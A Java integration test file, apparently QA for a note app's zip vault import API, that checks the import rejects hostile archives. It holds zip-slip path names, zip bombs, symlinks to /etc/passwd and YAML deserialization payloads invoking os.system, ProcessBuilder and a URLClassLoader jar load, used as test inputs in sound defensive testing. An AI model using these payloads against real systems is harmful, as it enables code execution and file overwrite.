package com.moneylog.qa;

import static org.assertj.core.api.Assertions.assertThat;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Import;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.transaction.PlatformTransactionManager;

import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;

import com.moneylog.core.note.util.NoteTestKit.Zip;
import com.moneylog.qa.CardQaWorld.Actor;
import com.moneylog.qa.CardQaWorld.Res;
import com.moneylog.qa.NoteQa.RawZip;
import com.moneylog.util.IntegrationTest;
import com.moneylog.util.ItAuth;
import com.moneylog.util.MutableClock;
import com.moneylog.util.MutableClockConfig;

/**
 * T113 (QA), critério 2: zips hostis e malformados contra a importação do vault, pela API. Zip slip em todas as formas, zip bomb, entradas
 * repetidas e conflitos de caixa/acento/Unicode, nomes reservados do Windows, texto que não é UTF-8, YAML malicioso, multipart fora do padrão,
 * zip truncado e corrompido. Em toda recusa nada pode ter sido gravado; nunca 5xx.
 */
@IntegrationTest
@Import(MutableClockConfig.class)
@DisplayName("QA T113: importação do vault com zips hostis")
class VaultZipQaIT {

    @Autowired
    private MockMvc mvc;
    @Autowired
    private ObjectMapper om;
    @Autowired
    private JdbcTemplate jdbc;
    @Autowired
    private ItAuth auth;
    @Autowired
    private PlatformTransactionManager tm;
    @Autowired
    private MutableClock clock;

    private CardQaWorld w;
    private Actor a;

    @BeforeEach
    void cenario() throws Exception {
        clock.set(MutableClockConfig.INITIAL);
        w = new CardQaWorld(mvc, om, jdbc, auth, tm, clock);
        a = w.new Actor("e6zip");
    }

    private Res up(byte[] zip, String mode) throws Exception {
        Res r = NoteQa.upload(w, a, zip, mode);
        assertThat(r.status()).as("nunca 5xx: %s", r).isLessThan(500);
        return r;
    }

    private void purge() {
        committed(() -> jdbc.update("delete from notes where user_id = ?", a.id));
    }

    private long notes() {
        return a.count("notes");
    }

    private List<String> paths() {
        return jdbc.queryForList("select path from notes where user_id = ? order by path", String.class, a.id);
    }

    // ------------------------------------------------------------------------------------------------ zip slip

    @Test
    @DisplayName("zip slip: .., ., absoluto, unidade, \\, controle, em qualquer entrada (até em arquivo que seria ignorado): 422 VAULT_IMPORT_INVALID e NADA gravado, nem as notas boas do mesmo zip")
    void zipSlipRecusado() throws Exception {
        String[] hostile = {"../evil.md", "a/../../evil.md", "/abs.md", "//abs.md", "C:/x.md", "c:\\x.md", "a\\b.md", "..\\evil.md", "./a.md", "a/./b.md",
                "a/../b.md", "a/..", "../x.txt", "../../etc/passwd", ".obsidian/../../x.md", "__MACOSX/../x.md", "a\u0000.md", "a\nb.md", "a\u001b[31m.md",
                "foo/../../../../../../etc/cron.d/x.md", "a/b/../../../x.png", "/", "./"};
        for (String name : hostile) {
            byte[] zip = new RawZip().add("ok.md", "boa").add(name, "x").add("ok2.md", "boa 2").bytes();
            Res r = up(zip, null);
            assertThat(r.status()).as("nome %s", name.replace("\u0000", "\\0").replace("\n", "\\n")).isEqualTo(422);
            assertThat(r.code()).as("nome %s", name).isEqualTo("VAULT_IMPORT_INVALID");
            assertThat(notes()).as("nada gravado com %s", name).isZero();
        }
    }

    @Test
    @DisplayName("zip slip codificado/Unicode: %2e%2e, ..%2f, ..;/, fullwidth, divisão U+2215, bidi, largura zero: nunca vira '..' (nenhum decode), nunca grava fora; ignora ou importa o nome literal")
    void zipSlipCodificado() throws Exception {
        String[] names = {"%2e%2e/x.md", "..%2fx.md", "%2e%2e%2fx.md", "..;/x.md", "..%5cx.md", "\uFF0E\uFF0E/x.md", "..\u2215x.md", "a\u202Eb.md",
                "\u200Bhidden.md", " ../x.md", "a/ ../b.md", "\u202E/x.md", "....//x.md", "a%00.md", "x.md%00.png", "con.md", "CON.md", "aux.txt.md",
                "Nul.md", "com1.md", "LPT9.md", "dir/COM3.MD", "con /x.md", "x.md.", "x .md", "a*b.md", "a?b.md", "a<b.md", "a|b.md", "a\"b.md"};
        Zip zip = new Zip();
        for (String n : names) {
            zip.add(n, "corpo de " + n.length());
        }
        Res r = up(zip.bytes(), null);
        assertThat(r.status()).as("%s", r).isEqualTo(200);
        for (String p : paths()) {
            assertThat(p).doesNotContain("..\\").doesNotStartWith("/");
            for (String segment : p.split("/")) {
                assertThat(segment).isNotEqualTo("..").isNotEqualTo(".");
            }
        }
        assertThat(paths()).doesNotContain("x.md");
        // nomes reservados do Windows e caracteres proibidos são ignorados, nunca importados
        assertThat(paths()).noneMatch(p -> p.toLowerCase().matches("(.*/)?(con|aux|nul|com[1-9]|lpt[1-9])(\\..*)?\\.md"));
        assertThat(paths()).noneMatch(p -> p.matches(".*[:*?<>|\"].*"));
        assertThat(r.node().get("ignoredFiles").size()).isGreaterThan(10);
    }

    @Test
    @DisplayName("symlink no zip (atributo Unix 0xA1FF) é só um arquivo .md com o texto do alvo: nada é seguido")
    void symlinkNaoESeguido() throws Exception {
        Res r = up(new RawZip().symlink("link.md", "/etc/passwd").symlink("../etc.md", "x").bytes(), null);
        assertThat(r.status()).isEqualTo(422);
        assertThat(notes()).isZero();
        Res ok = up(new RawZip().symlink("link.md", "/etc/passwd").bytes(), null);
        assertThat(ok.status()).isEqualTo(200);
        String body = jdbc.queryForObject("select body from notes where user_id = ? and path = 'link.md'", String.class, a.id);
        assertThat(body).isEqualTo("/etc/passwd");
    }

    @Test
    @DisplayName("nomes enormes: 65.535 caracteres e 140 entradas assim: sem 5xx, ignoradas e listadas; o tamanho da resposta é registrado")
    void nomesEnormes() throws Exception {
        String big = "a".repeat(65_000) + ".md";
        Res r = up(new RawZip().add(big, "x").add("ok.md", "y").bytes(), null);
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(1);
        // amplificação: 140 nomes de 60 KB (zip de ~17 MB) viram uma resposta com ~2 x 18 MB (ignoredFiles + warnings)
        RawZip many = new RawZip();
        for (int i = 0; i < 140; i++) {
            many.add(String.format("%05d-", i) + "b".repeat(60_000) + ".md", "");
        }
        byte[] bytes = many.bytes();
        long t = System.nanoTime();
        Res big2 = up(bytes, null);
        long ms = (System.nanoTime() - t) / 1_000_000;
        System.out.println("QA-E6-ZIP nomes enormes: zip=" + bytes.length + " bytes, resposta=" + big2.text().length() + " chars, " + ms + " ms, status=" + big2.status());
        assertThat(big2.status()).isIn(200, 422);
        assertThat(big2.text().length()).as("a resposta não deve ser maior que o zip enviado").isLessThanOrEqualTo(bytes.length + 1_000_000);
    }

    // ------------------------------------------------------------------------------------------------ zip bomb e limites

    @Test
    @DisplayName("zip bomb: 350 MB de zeros numa nota; 1.600 notas de 199 KB (311 MB); 5.501 entradas: 422 VAULT_IMPORT_TOO_LARGE e nada gravado; 2.000 entradas passam")
    void zipBomb() throws Exception {
        byte[] bomb = new RawZip().addZeros("bomb.md", 350L * 1024 * 1024).bytes();
        System.out.println("QA-E6-ZIP bomba única: " + bomb.length + " bytes compactados");
        Res r = up(bomb, null);
        assertThat(r.status()).isEqualTo(422);
        assertThat(r.code()).isEqualTo("VAULT_IMPORT_TOO_LARGE");

        RawZip many = new RawZip();
        for (int i = 0; i < 1600; i++) {
            many.addZeros("n" + i + ".md", 199L * 1024);
        }
        r = up(many.bytes(), null);
        assertThat(r.status()).isEqualTo(422);
        assertThat(r.code()).isEqualTo("VAULT_IMPORT_TOO_LARGE");

        Zip entries = new Zip();
        for (int i = 0; i < 5501; i++) {
            entries.add("n" + i + ".md", "x");
        }
        r = up(entries.bytes(), null);
        assertThat(r.status()).isEqualTo(422);
        assertThat(r.code()).isEqualTo("VAULT_IMPORT_TOO_LARGE");
        assertThat(notes()).isZero();

        Zip ok = new Zip();
        for (int i = 0; i < 2000; i++) {
            ok.add("n" + i + ".md", "texto " + i);
        }
        long t = System.nanoTime();
        r = up(ok.bytes(), null);
        System.out.println("QA-E6-ZIP 2.000 notas: " + (System.nanoTime() - t) / 1_000_000 + " ms");
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(2000);
    }

    @Test
    @DisplayName("zip aninhado: o .zip interno é um anexo ignorado e listado; um .md cujo conteúdo é um zip (bytes de controle) é ignorado com aviso; nada é descompactado de novo")
    void zipAninhado() throws Exception {
        byte[] inner = new Zip().add("dentro.md", "não deve entrar").bytes();
        Res r = up(new RawZip().add("backup.zip", inner).add("disfarce.md", inner).add("ok.md", "ok").bytes(), null);
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(1);
        assertThat(paths()).containsExactly("ok.md");
        List<String> ignored = new ArrayList<>();
        r.node().get("ignoredFiles").forEach(n -> ignored.add(n.asString()));
        assertThat(ignored).containsExactlyInAnyOrder("backup.zip", "disfarce.md");
    }

    // ------------------------------------------------------------------------------------------------ duplicadas e conflitos

    @Test
    @DisplayName("entradas repetidas no zip (mesmo nome, só caixa, NFC x NFD, extensão .MD): SKIP importa a primeira e lista as outras; RENAME guarda TODAS com 'nome (2).md', sem perder conteúdo")
    void duplicadas() throws Exception {
        byte[] zip = new RawZip().add("a.md", "primeira").add("a.md", "segunda").add("A.md", "terceira").add("a.MD", "quarta")
                .add("\u00e9.md", "nfc").add("e\u0301.md", "nfd").add("É.md", "maiuscula").bytes();
        Res r = up(zip, "SKIP");
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(2);
        assertThat(r.node().get("skipped").asInt()).isEqualTo(5);
        assertThat(jdbc.queryForObject("select body from notes where user_id = ? and path = 'a.md'", String.class, a.id)).isEqualTo("primeira");
        purge();

        r = up(zip, "RENAME");
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(7);
        assertThat(r.node().get("skipped").asInt()).isZero();
        List<String> bodies = jdbc.queryForList("select body from notes where user_id = ? order by body", String.class, a.id);
        assertThat(bodies).containsExactlyInAnyOrder("primeira", "segunda", "terceira", "quarta", "nfc", "nfd", "maiuscula");
        assertThat(paths()).doesNotHaveDuplicates();
        assertThat(jdbc.queryForObject("select count(*) from (select path_key from notes where user_id = ? group by path_key having count(*) > 1) d", Long.class, a.id)).isZero();
    }

    @Test
    @DisplayName("RENAME com a nota já existente 'a.md' e 'a (2).md': a nova vai para 'a (3).md'; com caminho de 255 caracteres não há nome livre: pula com aviso NOTE_PATH_TAKEN, sem 5xx")
    void renameEmCadeia() throws Exception {
        NoteQa.createOk(w, a, "a.md", "um");
        NoteQa.createOk(w, a, "a (2).md", "dois");
        Res r = up(new Zip().add("a.md", "tres").bytes(), "RENAME");
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("renamedFiles").get(0).get("to").asString()).isEqualTo("a (3).md");
        String longName = "x".repeat(252) + ".md";
        NoteQa.createOk(w, a, longName, "base");
        r = up(new Zip().add(longName, "outra").bytes(), "RENAME");
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isZero();
        assertThat(r.node().get("skipped").asInt()).isEqualTo(1);
        assertThat(r.text()).contains("NOTE_PATH_TAKEN");
    }

    @Test
    @DisplayName("modos de conflito: não existe OVERWRITE (400); modo em minúsculas ou vazio é 400; sem modo = SKIP; nenhuma nota existente é sobrescrita por SKIP nem por RENAME")
    void modosDeConflito() throws Exception {
        String id = NoteQa.createOk(w, a, "a.md", "original");
        byte[] zip = new Zip().add("a.md", "do zip").bytes();
        for (String mode : new String[] {"OVERWRITE", "overwrite", "skip", "REPLACE", "MERGE", "SKIP,RENAME"}) {
            Res r = up(zip, mode);
            assertThat(r.status()).as("modo '%s'", mode).isEqualTo(400);
        }
        assertThat(up(zip, null).node().get("skipped").asInt()).isEqualTo(1);
        up(zip, "RENAME");
        assertThat(NoteQa.get(a, id).get("body").asString()).isEqualTo("original");
        assertThat(NoteQa.get(a, id).get("version").asLong()).isZero();
        assertThat(notes()).isEqualTo(2);
    }

    @Test
    @DisplayName("limite de 5.000 notas (a lixeira conta): zip que estoura o limite é tudo ou nada (422 NOTE_LIMIT_REACHED) e o que existia fica intacto")
    void limiteDeNotas() throws Exception {
        long before = notes();
        committed(() -> jdbc.update("insert into notes (id,user_id,path,path_key,title,body,created_at,updated_at,version) select gen_random_uuid(), ?, 'seed/' || g || '.md', "
                + "'seed/' || g || '.md', 'seed ' || g, 'x', now(), now(), 0 from generate_series(1, 4995) g", a.id));
        assertThat(notes()).isEqualTo(before + 4995);
        Zip zip = new Zip();
        for (int i = 0; i < 10; i++) {
            zip.add("novas/" + i + ".md", "n" + i);
        }
        Res r = up(zip.bytes(), null);
        assertThat(r.status()).isEqualTo(422);
        assertThat(r.code()).isEqualTo("NOTE_LIMIT_REACHED");
        assertThat(notes()).isEqualTo(before + 4995);
        assertThat(jdbc.queryForObject("select count(*) from notes where user_id = ? and path like 'novas/%'", Long.class, a.id)).isZero();
        // cabem 5
        Zip five = new Zip();
        for (int i = 0; i < 5; i++) {
            five.add("novas/" + i + ".md", "n" + i);
        }
        assertThat(up(five.bytes(), null).status()).isEqualTo(200);
        assertThat(notes()).isEqualTo(before + 5000);
    }

    private void committed(Runnable work) {
        new org.springframework.transaction.support.TransactionTemplate(tm).executeWithoutResult(s -> work.run());
    }

    // ------------------------------------------------------------------------------------------------ texto e codificação

    @Test
    @DisplayName("não UTF-8: conteúdo Latin-1, UTF-16 e controle: ignorados com aviso e listados; BOM é removido")
    void naoUtf8() throws Exception {
        byte[] latin1 = "café".getBytes(StandardCharsets.ISO_8859_1);
        byte[] utf16 = "olá".getBytes(StandardCharsets.UTF_16);
        Res r = up(new RawZip().add("latin1.md", latin1).add("utf16.md", utf16).add("bom.md", "\uFEFFcom bom").add("ok.md", "ok").bytes(), null);
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(2);
        assertThat(r.text()).contains("NOTE_INVALID_ENCODING");
        assertThat(jdbc.queryForObject("select body from notes where user_id = ? and path = 'bom.md'", String.class, a.id)).isEqualTo("com bom");

    }

    @Test
    @DisplayName("BUG-QA-04: nome de entrada em CP1252 sem flag UTF-8 importa (ao menos as demais notas) em vez de derrubar o zip")
    void nomeCp1252() throws Exception {
        // nome em CP1252 sem o flag EFS: é o que o Explorer do Windows (versões antes do 11) e muitos zips antigos geram para "Revisão.md"
        byte[] cp1252Name = "Revisão.md".getBytes(java.nio.charset.Charset.forName("windows-1252"));
        Res w1252 = up(new RawZip().addRaw(cp1252Name, "corpo".getBytes(StandardCharsets.UTF_8), false).add("ok2.md", "ok").bytes(), null);
        System.out.println("QA-E6-ZIP nome CP1252 sem flag UTF-8: " + w1252);
        assertThat(w1252.status()).as("zip com nome em CP1252: deve importar (ao menos os demais) ou recusar com mensagem clara, nunca 5xx").isIn(200, 422);
        assertThat(w1252.status()).as("BUG-QA-?? um nome acentuado em CP1252 derruba a importação do zip inteiro").isEqualTo(200);
    }

    @Test
    @DisplayName("YAML malicioso no frontmatter: âncoras/aliases, billion laughs, !!python/!!java/ScriptEngineManager, aninhamento, 64 KB+, chave repetida: não é frontmatter, o texto entra como corpo (nada é interpretado ou perdido), rápido e sem 5xx")
    void yamlMalicioso() throws Exception {
        Map<String, String> payloads = new LinkedHashMap<>();
        payloads.put("alias recursivo", "a: &a [*a]");
        StringBuilder laughs = new StringBuilder("a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n");
        char prev = 'a';
        for (char c = 'b'; c <= 'i'; c++) {
            laughs.append(c).append(": &").append(c).append(" [*").append(prev).append(",*").append(prev).append(",*").append(prev).append(",*").append(prev)
                    .append(",*").append(prev).append(",*").append(prev).append(",*").append(prev).append(",*").append(prev).append(",*").append(prev).append("]\n");
            prev = c;
        }
        payloads.put("billion laughs", laughs.toString());
        payloads.put("python object", "x: !!python/object/apply:os.system ['id']");
        payloads.put("java ProcessBuilder", "x: !!java.lang.ProcessBuilder [['id']]");
        payloads.put("ScriptEngineManager", "x: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:1/x.jar']]]]");
        payloads.put("merge key", "base: &b {x: 1}\nfilho:\n  <<: *b");
        payloads.put("aninhamento 10000", "x: " + "[".repeat(10_000) + "]".repeat(10_000));
        payloads.put("aninhamento 9 niveis", "x: " + "[".repeat(9) + "]".repeat(9));
        payloads.put("acima de 64 KB", "title: " + "a".repeat(70_000));
        payloads.put("chave repetida", "a: 1\na: 2");
        payloads.put("lista aberta", "tags: [a, b");
        payloads.put("tab", "a:\n\t- 1");
        payloads.put("escalar no topo", "so um texto");
        payloads.put("binary", "x: !!binary |\n  R0lGODlhDAAMAIQAAP");
        payloads.put("timestamp", "date: 2026-10-05\nwhen: 2026-10-05T12:00:00Z");
        payloads.put("float inf", "x: .inf\ny: 1e999999999");
        payloads.put("set e omap", "s: !!set {a, b}\no: !!omap [a: 1]");
        long worst = 0;
        for (Map.Entry<String, String> p : payloads.entrySet()) {
            String text = "---\n" + p.getValue() + "\n---\ncorpo da nota";
            long t = System.nanoTime();
            Res r = up(new RawZip().add("y.md", text).bytes(), "RENAME");
            long ms = (System.nanoTime() - t) / 1_000_000;
            worst = Math.max(worst, ms);
            assertThat(r.status()).as("%s: %s", p.getKey(), r).isEqualTo(200);
            assertThat(ms).as("%s: tempo", p.getKey()).isLessThan(5_000);
            assertThat(r.node().get("created").asInt() + r.node().get("ignoredFiles").size()).as(p.getKey()).isEqualTo(1);
        }
        System.out.println("QA-E6-ZIP YAML: pior tempo " + worst + " ms em " + payloads.size() + " payloads");
        // S-273: o que não é um mapa YAML válido e seguro é corpo e fica byte a byte; nada é interpretado (só texto) e nada some em silêncio
        assertThat(jdbc.queryForObject("select count(*) from notes where user_id = ? and body like '---%' and body like '%corpo da nota'", Long.class, a.id))
                .as("todos os payloads viram nota com o texto original").isEqualTo((long) payloads.size());
        assertThat(jdbc.queryForList("select body from notes where user_id = ? and body like '%!!python%'", String.class, a.id)).hasSize(1)
                .allSatisfy(body -> assertThat(body).isEqualTo("---\nx: !!python/object/apply:os.system ['id']\n---\ncorpo da nota"));
    }

    @Test
    @DisplayName("YAML malicioso pela API (POST /v1/notes): não é frontmatter, o texto é guardado como corpo (201), nunca 500; título com NUL, controle e quebra de linha vindos de escapes do YAML")
    void yamlPelaApi() throws Exception {
        for (String yaml : new String[] {"a: &a [*a]", "x: !!python/object/apply:os.system ['id']", "x: !!java.lang.ProcessBuilder [['id']]", "tags: [a, b"}) {
            String text = "---\n" + yaml + "\n---\ncorpo";
            Res r = NoteQa.create(w, a, "y" + Math.abs(yaml.hashCode()) + ".md", text);
            assertThat(r.status()).as(yaml).isEqualTo(201);
            assertThat(r.node().get("body").asString()).as(yaml).isEqualTo(text);
            assertThat(r.node().get("tags")).as(yaml).isEmpty();
        }
        for (String yaml : new String[] {"title: \"a\\nb\"", "title: \"a\\x1bb\"", "title: \"a\\u202eb\"", "title: \"x\\u0085y\"", "tags: [\"\\u202e\", \"x\\ny\"]"}) {
            Res r = NoteQa.create(w, a, "t" + Math.abs(yaml.hashCode()) + ".md", "---\n" + yaml + "\n---\ncorpo");
            System.out.println("QA-E6-ZIP " + yaml + " -> " + r.status() + " " + r.code());
            assertThat(r.status()).as(yaml).isLessThan(500);
        }
        Res r = up(new RawZip().add("ok.md", "boa").add("y.md", "---\na: &a [*a]\n---\ncorpo").bytes(), null);
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(2);
    }

    @Test
    @DisplayName("BUG-QA-01: NUL (\\x00) vindo de escape do YAML no título ou nas tags do frontmatter: 422/ignorado, nunca 500 (na API e na importação do zip)")
    void nulNoFrontmatter() throws Exception {
        List<String> falhas = new ArrayList<>();
        for (String yaml : new String[] {"title: \"a\\x00b\"", "title: \"\\x00\"", "tags: [\"a\\x00b\"]", "tags: \"a\\x00b\"", "aliases: [\"a\\x00b\"]", "outra: \"a\\x00b\""}) {
            Res r = NoteQa.create(w, a, "n" + Math.abs(yaml.hashCode()) + ".md", "---\n" + yaml + "\n---\ncorpo");
            System.out.println("QA-E6-ZIP NUL " + yaml + " -> " + r.status() + " " + r.code());
            if (r.status() >= 500) {
                falhas.add("API " + yaml + " -> " + r.status());
            }
            Res imp = up(new RawZip().add("ok.md", "boa").add("nul.md", "---\n" + yaml + "\n---\ncorpo").bytes(), "RENAME");
            System.out.println("QA-E6-ZIP NUL import " + yaml + " -> " + imp.status());
            if (imp.status() >= 500) {
                falhas.add("IMPORT " + yaml + " -> " + imp.status());
            }
        }
        assertThat(falhas).isEmpty();
    }

    @Test
    @DisplayName("nota que começa com '---' (régua horizontal) sem ser frontmatter: criar pela API e importar não pode apagar nem recusar o texto do usuário")
    void reguaHorizontalNaoEFrontmatter() throws Exception {
        String text = "---\nAta da reunião\n---\nConteúdo depois da régua";
        Res api = NoteQa.create(w, a, "ata.md", text);
        System.out.println("QA-E6-ZIP régua pela API: " + api.status() + " " + api.code());
        Res imp = up(new RawZip().add("ata2.md", text).bytes(), null);
        String body = jdbc.queryForList("select body from notes where user_id = ? and path = 'ata2.md'", String.class, a.id).stream().findFirst().orElse("(sem nota)");
        System.out.println("QA-E6-ZIP régua importada: " + imp.status() + " corpo salvo=[" + body.replace("\n", "\\n") + "]");
        assertThat(api.status()).as("o Obsidian abre e guarda este arquivo; a API recusa com %s", api.code()).isEqualTo(201);
        assertThat(body).as("a importação descarta o texto entre as réguas").contains("Ata da reunião");
    }

    // ------------------------------------------------------------------------------------------------ multipart fora do padrão

    @Test
    @DisplayName("multipart: sem a parte 'file' (400), arquivo vazio (422 VAULT_IMPORT_INVALID), campos extras ignorados, parte com outro nome, JSON no lugar do multipart (415), GET (405), arquivo que não é zip")
    void multipartFora() throws Exception {
        var noFile = MockMvcRequestBuilders.multipart("/v1/vault/import").param("mode", "SKIP").header(HttpHeaders.AUTHORIZATION, a.bearer);
        Res r = NoteQa.finish(w, mvc.perform(noFile).andReturn(), "sem file");
        assertThat(r.status()).as("%s", r).isEqualTo(400);
        assertThat(r.code()).isEqualTo("VALIDATION_FAILED");

        var wrongName = MockMvcRequestBuilders.multipart("/v1/vault/import").file(new MockMultipartFile("arquivo", "v.zip", "application/zip", new Zip().add("a.md", "x").bytes()))
                .header(HttpHeaders.AUTHORIZATION, a.bearer);
        assertThat(NoteQa.finish(w, mvc.perform(wrongName).andReturn(), "parte com outro nome").status()).isEqualTo(400);

        var empty = MockMvcRequestBuilders.multipart("/v1/vault/import").file(new MockMultipartFile("file", "v.zip", "application/zip", new byte[0]))
                .header(HttpHeaders.AUTHORIZATION, a.bearer);
        r = NoteQa.finish(w, mvc.perform(empty).andReturn(), "vazio");
        assertThat(r.status()).isEqualTo(422);
        assertThat(r.code()).isEqualTo("VAULT_IMPORT_INVALID");

        var extra = MockMvcRequestBuilders.multipart("/v1/vault/import").file(new MockMultipartFile("file", "v.zip", "application/zip", new Zip().add("a.md", "x").bytes()))
                .file(new MockMultipartFile("outro", "o.txt", "text/plain", "lixo".getBytes(StandardCharsets.UTF_8))).param("extra", "1").param("userId", a.id.toString())
                .header(HttpHeaders.AUTHORIZATION, a.bearer);
        r = NoteQa.finish(w, mvc.perform(extra).andReturn(), "campos extras");
        assertThat(r.status()).isEqualTo(200);
        assertThat(r.node().get("created").asInt()).isEqualTo(1);

        var two = MockMvcRequestBuilders.multipart("/v1/vault/import").file(new MockMultipartFile("file", "1.zip", "application/zip", new Zip().add("b.md", "1").bytes()))
                .file(new MockMultipartFile("file", "2.zip", "application/zip", new Zip().add("c.md", "2").bytes())).header(HttpHeaders.AUTHORIZATION, a.bearer);
        r = NoteQa.finish(w, mvc.perform(two).andReturn(), "duas partes file");
        assertThat(r.status()).isLessThan(500);

        var json = MockMvcRequestBuilders.post("/v1/vault/import").contentType(MediaType.APPLICATION_JSON).content("{}").header(HttpHeaders.AUTHORIZATION, a.bearer);
        assertThat(NoteQa.finish(w, mvc.perform(json).andReturn(), "json").status()).isIn(400, 415);

        var getImport = MockMvcRequestBuilders.get("/v1/vault/import").header(HttpHeaders.AUTHORIZATION, a.bearer);
        assertThat(NoteQa.finish(w, mvc.perform(getImport).andReturn(), "GET import").status()).isEqualTo(405);

        for (byte[] junk : new byte[][] {"isto não é um zip".getBytes(StandardCharsets.UTF_8), new byte[] {'P', 'K', 3, 4}, new byte[] {'P', 'K', 5, 6, 0, 0, 0, 0},
                "PK".getBytes(StandardCharsets.UTF_8), new byte[1000]}) {
            r = up(junk, null);
            assertThat(r.status()).as("lixo %d bytes", junk.length).isIn(200, 422);
            if (r.status() == 200) {
                assertThat(r.node().get("created").asInt()).isZero();
            } else {
                assertThat(r.code()).isEqualTo("VAULT_IMPORT_INVALID");
            }
        }
    }

    // ------------------------------------------------------------------------------------------------ truncado e corrompido

    @Test
    @DisplayName("zip truncado em ~120 pontos: ou 422 VAULT_IMPORT_INVALID, ou (corte só no diretório central) as 40 notas completas. Importar MENOS notas sem erro é perda silenciosa")
    void zipTruncado() throws Exception {
        Zip z = new Zip();
        for (int i = 0; i < 40; i++) {
            z.add("pasta/nota-" + i + ".md", ("# Nota " + i + "\n" + "texto de enchimento ".repeat(15)) + i);
        }
        byte[] full = z.bytes();
        Random rnd = new Random(20261009L);
        List<Integer> cuts = new ArrayList<>();
        for (int i = 0; i < 100; i++) {
            cuts.add(1 + rnd.nextInt(full.length - 1));
        }
        for (int i = 1; i <= 20; i++) {
            cuts.add(full.length - i * 3);
        }
        int silent = 0;
        int invalid = 0;
        int complete = 0;
        List<String> partial = new ArrayList<>();
        for (int cut : cuts) {
            byte[] truncated = java.util.Arrays.copyOf(full, cut);
            Res r = up(truncated, null);
            if (r.status() == 422) {
                assertThat(r.code()).isEqualTo("VAULT_IMPORT_INVALID");
                assertThat(notes()).as("recusado: nada gravado").isZero();
                invalid++;
            } else {
                int created = r.node().get("created").asInt();
                if (created == 40) {
                    complete++;
                } else {
                    silent++;
                    partial.add(cut + " bytes -> created=" + created);
                }
                purge();
            }
        }
        System.out.println("QA-E6-ZIP truncado: total=" + cuts.size() + " recusados=" + invalid + " completos=" + complete + " PARCIAIS SILENCIOSOS=" + silent
                + (partial.isEmpty() ? "" : " ex.: " + partial.subList(0, Math.min(5, partial.size()))));
        assertThat(partial).as("zip truncado importado pela metade sem erro").isEmpty();
    }

    @Test
    @DisplayName("zip com bytes corrompidos (1 a 3 bytes trocados em 150 posições, semente fixa): nunca 5xx; recusa tudo ou importa sem erro; CRC inválido nunca passa")
    void zipCorrompido() throws Exception {
        Zip z = new Zip();
        for (int i = 0; i < 20; i++) {
            z.add("n" + i + ".md", "# Nota " + i + "\n" + "texto de enchimento ".repeat(20));
        }
        byte[] full = z.bytes();
        Random rnd = new Random(31415L);
        Map<Integer, Integer> statuses = new LinkedHashMap<>();
        for (int i = 0; i < 150; i++) {
            byte[] bad = full.clone();
            for (int k = 0; k < 1 + rnd.nextInt(3); k++) {
                bad[rnd.nextInt(bad.length)] ^= (byte) (1 + rnd.nextInt(255));
            }
            Res r = up(bad, rnd.nextBoolean() ? "RENAME" : "SKIP");
            statuses.merge(r.status(), 1, Integer::sum);
            if (r.status() == 422) {
                assertThat(notes()).isZero();
            } else {
                purge();
            }
        }
        System.out.println("QA-E6-ZIP corrompido: " + statuses);
    }

    // ------------------------------------------------------------------------------------------------ pastas especiais

    @Test
    @DisplayName(".obsidian/, .trash/, __MACOSX/, anexos, canvas, .DS_Store, Thumbs.db e pastas vazias: só os .md importam; o resto é listado; CRLF e CR sozinho preservados byte a byte")
    void pastasEspeciais() throws Exception {
        byte[] zip = new Zip().dir("v").add(".obsidian/workspace.json", "{}").add(".obsidian/plugins/x/main.js", "alert(1)").add(".trash/velha.md", "x")
                .add("__MACOSX/v/._a.md", "x").add(".DS_Store", "x").add("Thumbs.db", "x").add("anexo.pdf", "%PDF").add("quadro.canvas", "{}").add("img/foto.png", "png")
                .add("crlf.md", "linha1\r\nlinha2\r\n").add("cr.md", "a\rb").add("sem-quebra.md", "fim").add(".oculta.md", "x").add("pasta/.oculta/n.md", "x")
                .add("vazia.md", "").bytes();
        Res r = up(zip, null);
        assertThat(r.status()).isEqualTo(200);
        assertThat(paths()).containsExactlyInAnyOrder("cr.md", "crlf.md", "sem-quebra.md", "vazia.md");
        assertThat(jdbc.queryForObject("select body from notes where user_id = ? and path = 'crlf.md'", String.class, a.id)).isEqualTo("linha1\r\nlinha2\r\n");
        assertThat(jdbc.queryForObject("select body from notes where user_id = ? and path = 'cr.md'", String.class, a.id)).isEqualTo("a\rb");
        List<String> ignored = new ArrayList<>();
        r.node().get("ignoredFiles").forEach(n -> ignored.add(n.asString()));
        assertThat(ignored).contains(".obsidian/workspace.json", ".obsidian/plugins/x/main.js", ".trash/velha.md", "__MACOSX/v/._a.md", ".DS_Store", "Thumbs.db", "anexo.pdf",
                "quadro.canvas", "img/foto.png", ".oculta.md", "pasta/.oculta/n.md");
    }

    @Test
    @DisplayName("zip sem diretório central (só cabeçalhos locais, como alguns geradores em fluxo) é lido; zip com um só diretório (nenhuma entrada) é 200 com 0 criadas")
    void zipSemDiretorioCentral() throws Exception {
        Res r = up(new RawZip().add("a.md", "oi").withoutCentralDirectory().bytes(), null);
        System.out.println("QA-E6-ZIP sem diretório central: " + r);
